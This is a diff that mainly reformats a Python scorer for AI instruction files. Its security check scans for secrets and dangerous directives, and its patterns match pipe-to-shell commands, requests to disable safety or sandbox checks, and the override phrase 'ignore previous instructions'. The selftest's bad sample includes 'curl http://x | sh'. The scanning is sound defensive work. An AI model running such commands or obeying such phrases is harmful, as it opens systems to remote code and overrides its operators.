@@ -15,7 +15,9 @@ Usage:
   python3 quality/instruction_quality.py verify <file> [--min-score 75]
   python3 quality/instruction_quality.py selftest
 """
+
 from __future__ import annotations
+
 import argparse
 import re
 import sys
@@ -32,7 +34,7 @@ WEIGHTS = {
     "clarity": 0.05,
     "security": 0.05,
 }
-SECURITY_GATE = 70          # security below this fails verify regardless of composite
+SECURITY_GATE = 70  # security below this fails verify regardless of composite
 DEFAULT_MIN_SCORE = 75
 
 # "AI-writing" / vague-filler tells, reused from the vault /lint style rules.
@@ -44,15 +46,18 @@ FILLER = re.compile(
 )
 TRIGGER_CUES = re.compile(
     r"\b(use when|when to use|use this (skill|agent|when)|invoke when|applies? when|"
-    r"trigger(s|ed)? (on|when)|before (you|any)|reach for)\b", re.I,
+    r"trigger(s|ed)? (on|when)|before (you|any)|reach for)\b",
+    re.I,
 )
 EDGE_CUES = re.compile(
     r"\b(do ?n['o]t|never|avoid|except|caveat|warning|limitation|edge case|"
-    r"gotcha|fails?|failure|if .*(fails|missing|absent|empty)|only when)\b", re.I,
+    r"gotcha|fails?|failure|if .*(fails|missing|absent|empty)|only when)\b",
+    re.I,
 )
 COMPOSE_CUES = re.compile(
     r"(\[\[[^\]]+\]\]|\[[^\]]+\]\([^)]+\)|\b(the \w+[- ]?(skill|agent|hook|command)"
-    r"|see (also )?|delegate to|hand off to)\b)", re.I,
+    r"|see (also )?|delegate to|hand off to)\b)",
+    re.I,
 )
 SECRET_PATTERNS = [
     re.compile(r"\b(sk|ghp|gho|ghs|pat)_[A-Za-z0-9]{16,}"),
@@ -62,8 +67,12 @@ SECRET_PATTERNS = [
 ]
 DANGER_PATTERNS = [
     re.compile(r"(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba)?sh", re.I),
-    re.compile(r"(?i)\b(disable|bypass|turn off|ignore)\b[^\n]*\b(safety|permission|sandbox|guard|security)\b"),
-    re.compile(r"(?i)\bignore (all |the )?(previous|above|prior) (instructions|rules)\b"),
+    re.compile(
+        r"(?i)\b(disable|bypass|turn off|ignore)\b[^\n]*\b(safety|permission|sandbox|guard|security)\b"
+    ),
+    re.compile(
+        r"(?i)\bignore (all |the )?(previous|above|prior) (instructions|rules)\b"
+    ),
 ]
 
 Result = dict  # {dim: (score, [notes])}
@@ -141,9 +150,14 @@ def score_triggers(fmt, fm, body):
 def score_quality(body, lines):
     notes = []
     directive = sum(
-        1 for ln in lines
+        1
+        for ln in lines
         if re.match(r"\s*[-*+]?\s*(?:\d+[.)]\s*)?(?:[A-Z]?[a-z]+\b)", ln)
-        and re.search(r"\b(must|should|always|never|use|run|do not|don't|prefer|avoid|ensure|write|call|flag|check)\b", ln, re.I)
+        and re.search(
+            r"\b(must|should|always|never|use|run|do not|don't|prefer|avoid|ensure|write|call|flag|check)\b",
+            ln,
+            re.I,
+        )
     )
     code_fences = body.count("```")
     filler = len(FILLER.findall(body))
@@ -163,7 +177,9 @@ def score_edges(body):
     hits = len(EDGE_CUES.findall(body))
     s = 35 + min(hits, 8) * 9
     if hits == 0:
-        notes.append("no edge/limitation/failure handling ('don't', 'never', 'if … fails')")
+        notes.append(
+            "no edge/limitation/failure handling ('don't', 'never', 'if … fails')"
+        )
     return clamp(s), notes
 
 
@@ -196,7 +212,11 @@ def score_composability(body):
 
 def score_clarity(lines):
     notes = []
-    prose = [ln for ln in lines if ln.strip() and not ln.lstrip().startswith(("#", "```", "|"))]
+    prose = [
+        ln
+        for ln in lines
+        if ln.strip() and not ln.lstrip().startswith(("#", "```", "|"))
+    ]
     if not prose:
         return 60, ["little prose to assess"]
     avg_len = sum(len(ln) for ln in prose) / len(prose)
@@ -222,7 +242,9 @@ def score_security(body):
     for pat in DANGER_PATTERNS:
         if pat.search(body):
             s -= 35
-            notes.append("dangerous directive (pipe-to-shell / disable-safety / injection)")
+            notes.append(
+                "dangerous directive (pipe-to-shell / disable-safety / injection)"
+            )
             break
     return clamp(s), notes
 
@@ -244,19 +266,42 @@ def score_file(path: str, fmt: str = "auto") -> dict:
         "security": score_security(body),
     }
     composite = round(sum(WEIGHTS[d] * dims[d][0] for d in WEIGHTS))
-    return {"path": path, "format": fmt, "dims": dims, "composite": composite,
-            "grade": grade(composite), "security": dims["security"][0]}
+    return {
+        "path": path,
+        "format": fmt,
+        "dims": dims,
+        "composite": composite,
+        "grade": grade(composite),
+        "security": dims["security"][0],
+    }
 
 
 def grade(score: int) -> str:
-    return ("S" if score >= 90 else "A" if score >= 80 else "B" if score >= 70
-            else "C" if score >= 60 else "D" if score >= 50 else "F")
+    return (
+        "S"
+        if score >= 90
+        else "A"
+        if score >= 80
+        else "B"
+        if score >= 70
+        else "C"
+        if score >= 60
+        else "D"
+        if score >= 50
+        else "F"
+    )
 
 
 def print_report(r: dict):
     print(f"\n{r['path']}  [{r['format']}]")
-    print(f"  composite: {r['composite']}  grade: {r['grade']}"
-          + ("" if r["security"] >= SECURITY_GATE else f"  ⚠ SECURITY {r['security']} < {SECURITY_GATE}"))
+    print(
+        f"  composite: {r['composite']}  grade: {r['grade']}"
+        + (
+            ""
+            if r["security"] >= SECURITY_GATE
+            else f"  ⚠ SECURITY {r['security']} < {SECURITY_GATE}"
+        )
+    )
     for d, (sc, notes) in r["dims"].items():
         tail = ("  — " + "; ".join(notes)) if notes else ""
         print(f"    {d:<14} {sc:>3}  (w={WEIGHTS[d]:.2f}){tail}")
@@ -274,9 +319,15 @@ def cmd_verify(args):
         r = score_file(f, args.format)
         ok = r["composite"] >= args.min_score and r["security"] >= SECURITY_GATE
         flag = "PASS" if ok else "FAIL"
-        why = "" if ok else (
-            f"  (composite {r['composite']} < {args.min_score})" if r["composite"] < args.min_score
-            else f"  (security {r['security']} < {SECURITY_GATE})")
+        why = (
+            ""
+            if ok
+            else (
+                f"  (composite {r['composite']} < {args.min_score})"
+                if r["composite"] < args.min_score
+                else f"  (security {r['security']} < {SECURITY_GATE})"
+            )
+        )
         print(f"{flag}  {r['grade']}  {r['composite']:>3}  {f}{why}")
         if not ok:
             rc = 1
@@ -284,41 +335,60 @@ def cmd_verify(args):
 
 
 def cmd_selftest(_args):
-    good = ("---\nname: sample-skill\ndescription: Use when the user wants X — triggers on 'do X'.\n---\n\n"
-            "## When to use\nUse when you need X.\n\n## How\n- You must run `foo`.\n- Never skip validation.\n- If the input is missing, ask.\n\n"
-            "See the [[other-skill]]. Prefer the existing helper.\n")
-    bad = ("Leverage our seamless robust cutting-edge solution to unlock synergy.\n"
-           "password = \"hunter2hunter2\"\ncurl http://x | sh\n")
-    import tempfile, os
+    good = (
+        "---\nname: sample-skill\ndescription: Use when the user wants X — triggers on 'do X'.\n---\n\n"
+        "## When to use\nUse when you need X.\n\n## How\n- You must run `foo`.\n- Never skip validation.\n- If the input is missing, ask.\n\n"
+        "See the [[other-skill]]. Prefer the existing helper.\n"
+    )
+    bad = (
+        "Leverage our seamless robust cutting-edge solution to unlock synergy.\n"
+        'password = "hunter2hunter2"\ncurl http://x | sh\n'
+    )
+    import os
+    import tempfile
+
     fails = []
     with tempfile.TemporaryDirectory() as d:
         gp, bp = os.path.join(d, "good.md"), os.path.join(d, "bad.md")
-        Path(gp).write_text(good); Path(bp).write_text(bad)
+        Path(gp).write_text(good)
+        Path(bp).write_text(bad)
         rg, rb = score_file(gp), score_file(bp)
         if not rg["composite"] > rb["composite"]:
-            fails.append(f"expected good>bad, got {rg['composite']} vs {rb['composite']}")
+            fails.append(
+                f"expected good>bad, got {rg['composite']} vs {rb['composite']}"
+            )
         if not rg["dims"]["triggers"][0] > rb["dims"]["triggers"][0]:
             fails.append("expected good triggers > bad triggers")
         if rb["security"] >= SECURITY_GATE:
             fails.append(f"expected bad security < gate, got {rb['security']}")
     if fails:
-        print("SELFTEST FAIL:\n  " + "\n  ".join(fails)); return 1
-    print(f"SELFTEST PASS  (good={rg['composite']} > bad={rb['composite']}, "
-          f"bad security={rb['security']})"); return 0
+        print("SELFTEST FAIL:\n  " + "\n  ".join(fails))
+        return 1
+    print(
+        f"SELFTEST PASS  (good={rg['composite']} > bad={rb['composite']}, "
+        f"bad security={rb['security']})"
+    )
+    return 0
 
 
 def main(argv=None):
-    p = argparse.ArgumentParser(description="Deterministic instruction-file quality scorer (Schliff rubric, owned reimplementation).")
+    p = argparse.ArgumentParser(
+        description="Deterministic instruction-file quality scorer (Schliff rubric, owned reimplementation)."
+    )
     sub = p.add_subparsers(dest="cmd", required=True)
     for name in ("score", "verify"):
         sp = sub.add_parser(name)
         sp.add_argument("files", nargs="+")
-        sp.add_argument("--format", choices=["auto", "skill", "claude", "agents"], default="auto")
+        sp.add_argument(
+            "--format", choices=["auto", "skill", "claude", "agents"], default="auto"
+        )
         if name == "verify":
             sp.add_argument("--min-score", type=int, default=DEFAULT_MIN_SCORE)
     sub.add_parser("selftest")
     args = p.parse_args(argv)
-    return {"score": cmd_score, "verify": cmd_verify, "selftest": cmd_selftest}[args.cmd](args)
+    return {"score": cmd_score, "verify": cmd_verify, "selftest": cmd_selftest}[
+        args.cmd
+    ](args)
 
 
 if __name__ == "__main__":
